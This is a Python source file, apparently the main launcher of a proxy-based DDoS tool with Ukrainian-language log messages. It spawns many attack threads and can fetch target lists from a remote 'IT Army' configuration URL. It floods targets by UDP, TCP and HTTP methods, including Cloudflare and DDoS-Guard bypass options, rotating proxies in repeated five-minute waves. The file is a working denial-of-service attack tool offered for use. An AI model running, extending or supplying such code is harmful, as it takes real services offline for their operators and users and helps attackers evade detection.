# @formatter:off
import colorama; colorama.init()
# @formatter:on
import queue
from collections import namedtuple
from concurrent.futures import Future, Executor
from concurrent.futures.thread import _WorkItem
from random import seed
from threading import Thread, Event
from time import sleep, time

from src.cli import init_argparse
from src.core import logger, cl, UDP_THREADS, LOW_RPC, IT_ARMY_CONFIG_URL
from src.dns_utils import resolve_all_targets
from src.mhddos import main as mhddos_main
from src.output import AtomicCounter, show_statistic, print_banner, print_progress
from src.proxies import update_proxies
from src.system import fix_ulimits, is_latest_version
from src.targets import Targets


Params = namedtuple('Params', 'target, method, threads')

PAD_THREADS = 30

TERMINATE = object()


class DaemonThreadPool(Executor):
    def __init__(self):
        self._queue = queue.SimpleQueue()

    def start(self, num_threads):
        threads_started = num_threads
        for cnt in range(num_threads):
            try:
                Thread(target=self._worker, daemon=True).start()
            except RuntimeError:
                for _ in range(PAD_THREADS):
                    self._queue.put(TERMINATE)
                threads_started = cnt - PAD_THREADS
                if threads_started <= 0:
                    logger.warning(f'{cl.RED}Не вдалося запустити атаку - вичерпано ліміт потоків системи{cl.RESET}')
                    exit()
                logger.warning(
                    f'{cl.RED}Не вдалося запустити усі {num_threads} потоків - лише {threads_started}{cl.RESET}'
                )
                break
        return threads_started

    def submit(self, fn, *args, **kwargs):
        f = Future()
        w = _WorkItem(f, fn, args, kwargs)
        self._queue.put(w)
        return f

    def _worker(self):
        while True:
            work_item = self._queue.get(block=True)
            if work_item is TERMINATE:
                return

            if work_item is not None:
                work_item.run()
                del work_item


def run_ddos(thread_pool, proxies, targets, total_threads, period, rpc, http_methods, vpn_mode, debug, table):
    threads_per_target = total_threads // len(targets)
    params_list = []
    for target in targets:
        assert target.is_resolved, "Unresolved target cannot be used for attack"
        # udp://, method defaults to "UDP"
        if target.is_udp:
            params_list.append(Params(target, target.method or 'UDP', UDP_THREADS))
        # Method is given explicitly
        elif target.method is not None:
            params_list.append(Params(target, target.method, threads_per_target))
        # tcp://
        elif target.url.scheme == "tcp":
            params_list.append(Params(target, 'TCP', threads_per_target))
        # HTTP(S), methods from --http-methods
        elif target.url.scheme in {"http", "https"}:
            threads = threads_per_target // len(http_methods)
            for method in http_methods:
                params_list.append(Params(target, method, threads))
        else:
            raise ValueError(f"Unsupported scheme given: {target.url.scheme}")

    logger.info(f'{cl.YELLOW}Запускаємо атаку...{cl.RESET}')
    statistics = {}
    event = Event()
    event.set()
    for params in params_list:
        thread_statistics = {'requests': AtomicCounter(), 'bytes': AtomicCounter()}
        statistics[params] = thread_statistics
        kwargs = {
            'url': params.target.url,
            'ip': params.target.addr,
            'method': params.method,
            'threads': params.threads,
            'rpc': int(params.target.option("rpc", "0")) or rpc,
            'thread_pool': thread_pool,
            'event': event,
            'statistics': thread_statistics,
            'proxies': proxies,
        }
        mhddos_main(**kwargs)
        if not table:
            logger.info(
                f"{cl.YELLOW}Атакуємо{cl.BLUE} %s{cl.YELLOW} методом{cl.BLUE} %s{cl.YELLOW}, потоків:{cl.BLUE} %d{cl.YELLOW}!{cl.RESET}"
                % (params.target.url.host, params.method, params.threads))

    if not (table or debug):
        print_progress(period, 0, len(proxies))
        sleep(period)
    else:
        ts = time()
        refresh_rate = 4 if table else 2
        sleep(refresh_rate)
        while True:
            passed = time() - ts
            if passed > period:
                break
            show_statistic(statistics, refresh_rate, table, vpn_mode, len(proxies), period, passed)
            sleep(refresh_rate)
    event.clear()


def start(args):
    print_banner(args.vpn_mode)
    fix_ulimits()
    
    seed(time())

    if args.table:
        args.debug = False

    for bypass in ('CFB', 'DGB'):
        if bypass in args.http_methods:
            logger.warning(
                f'{cl.RED}Робота методу {bypass} не гарантована - атака методами '
                f'за замовчуванням може бути ефективніша{cl.RESET}'
            )

    thread_pool = DaemonThreadPool()
    total_threads = thread_pool.start(args.threads)  # It is possible that not all threads were started
    if args.itarmy:
        targets_iter = Targets([], IT_ARMY_CONFIG_URL)
    else:
        targets_iter = Targets(args.targets, args.config)

    proxies = []
    is_old_version = not is_latest_version()
    while True:
        if is_old_version:
            print(f'{cl.RED}! ЗАПУЩЕНА НЕ ОСТАННЯ ВЕРСІЯ - ОНОВІТЬСЯ{cl.RESET}: https://telegra.ph/Onovlennya-mhddos-proxy-04-16\n')

        while True:
            targets = list(targets_iter)
            if not targets:
                logger.error(f'{cl.RED}Не вказано жодної цілі для атаки{cl.RESET}')
                exit()

            targets = resolve_all_targets(targets, thread_pool)
            targets = [target for target in targets if target.is_resolved]
            if targets:
                break
            else:
                logger.warning(f'{cl.RED}Не знайдено жодної доступної цілі - чекаємо 30 сек до наступної перевірки{cl.RESET}')
                sleep(30)

        if args.rpc < LOW_RPC:
            logger.warning(
                f'{cl.RED}RPC менше за {LOW_RPC}. Це може призвести до падіння продуктивності '
                f'через збільшення кількості перепідключень{cl.RESET}'
            )

        no_proxies = args.vpn_mode or all(target.is_udp for target in targets)
        if no_proxies:
            proxies = []
        else:
            proxies = update_proxies(args.proxies, proxies)

        period = 300
        run_ddos(
            thread_pool,
            proxies,
            targets,
            total_threads,
            period,
            args.rpc,
            args.http_methods,
            args.vpn_mode,
            args.debug,
            args.table
        )


if __name__ == '__main__':
    try:
        start(init_argparse().parse_args())
    except KeyboardInterrupt:
        logger.info(f'{cl.BLUE}Завершуємо роботу...{cl.RESET}')
